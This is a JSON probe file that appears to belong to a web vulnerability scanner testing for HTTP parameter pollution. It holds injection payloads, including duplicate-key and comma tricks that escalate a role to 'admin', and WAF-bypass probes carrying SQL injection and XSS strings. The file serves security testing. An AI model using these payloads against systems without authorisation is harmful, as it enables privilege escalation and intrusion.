{
  "category": "hpp",
  "contexts": {
    "query_duplicate": {
      "description": "Query string parameter duplication",
      "tech_match": [],
      "param_match": ["id", "user_id", "email", "amount", "action", "redirect", "page"],
      "probes": [
        {
          "payload": "{{baseline}}&{{param}}=injected",
          "description": "Append duplicate parameter — backend may use last value",
          "matchers": [{"type": "length_diff", "min_diff": 50}],
          "severity": "medium",
          "confidence_boost": 30
        },
        {
          "payload": "injected&{{param}}={{baseline}}",
          "description": "Prepend duplicate parameter — backend may use first value",
          "matchers": [{"type": "length_diff", "min_diff": 50}],
          "severity": "medium",
          "confidence_boost": 30
        }
      ]
    },
    "array_notation": {
      "description": "Array parameter injection",
      "tech_match": ["PHP", "Ruby", "Node.js"],
      "param_match": ["id", "ids", "user_id", "item"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Test array notation: param[]=1&param[]=2",
          "matchers": [{"type": "status", "status": [200, 500]}, {"type": "length_diff", "min_diff": 100}],
          "severity": "medium",
          "confidence_boost": 25
        }
      ]
    },
    "json_body_pollution": {
      "description": "JSON body duplicate key injection",
      "tech_match": [],
      "param_match": [],
      "probes": [
        {
          "payload": "{\"role\":\"user\",\"role\":\"admin\"}",
          "description": "Duplicate JSON key — some parsers use last value",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["error", "invalid"]}],
          "severity": "high",
          "confidence_boost": 35
        }
      ]
    },
    "comma_separated": {
      "description": "Comma-separated value injection in a single parameter",
      "tech_match": [],
      "param_match": ["id", "user_id", "role", "permission", "scope"],
      "probes": [
        {
          "payload": "{{baseline}},admin",
          "description": "Append comma-separated value. Some backends split on comma and process each.",
          "matchers": [{"type": "length_diff", "min_diff": 50}],
          "severity": "medium",
          "confidence_boost": 25
        }
      ]
    },
    "semicolon_separated": {
      "description": "Semicolon-separated query parameter injection (IIS/ASP.NET treats ; as &)",
      "tech_match": ["IIS", "ASP.NET"],
      "param_match": ["id", "user_id", "page", "action"],
      "probes": [
        {
          "payload": "{{baseline}};{{param}}=injected",
          "description": "IIS/ASP.NET treats semicolons as parameter delimiters. The injected parameter may override or add to the request.",
          "matchers": [{"type": "length_diff", "min_diff": 50}],
          "severity": "medium",
          "confidence_boost": 30
        }
      ]
    },
    "waf_bypass_via_hpp": {
      "description": "Use HPP to bypass WAF inspection — WAF inspects first value, backend uses last",
      "tech_match": [],
      "param_match": ["id", "q", "search", "query", "name"],
      "probes": [
        {
          "payload": "safe&{{param}}={{baseline}}' OR '1'='1",
          "description": "First parameter is clean (passes WAF), second contains SQLi payload (processed by backend).",
          "matchers": [{"type": "word", "value": ["error", "syntax", "SQL"]}],
          "severity": "high",
          "confidence_boost": 40
        },
        {
          "payload": "safe&{{param}}=<script>alert(1)</script>",
          "description": "First parameter is clean, second contains XSS payload.",
          "matchers": [{"type": "word", "value": ["<script>alert(1)</script>"]}],
          "severity": "high",
          "confidence_boost": 40
        }
      ]
    }
  }
}
